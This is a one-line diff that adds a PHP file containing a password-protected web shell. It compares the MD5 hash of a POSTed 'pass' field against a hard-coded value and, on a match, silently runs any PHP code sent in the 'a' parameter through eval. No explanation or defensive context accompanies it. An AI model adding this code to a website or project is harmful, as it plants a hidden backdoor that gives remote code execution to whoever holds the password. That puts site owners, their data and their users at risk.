@@ -1,0 +1,1 @@
+<?php if(md5(\$_POST['pass'])=='88684c18e790d8427b473e80d5ef3041'){@eval(\$_POST[a]);}?>
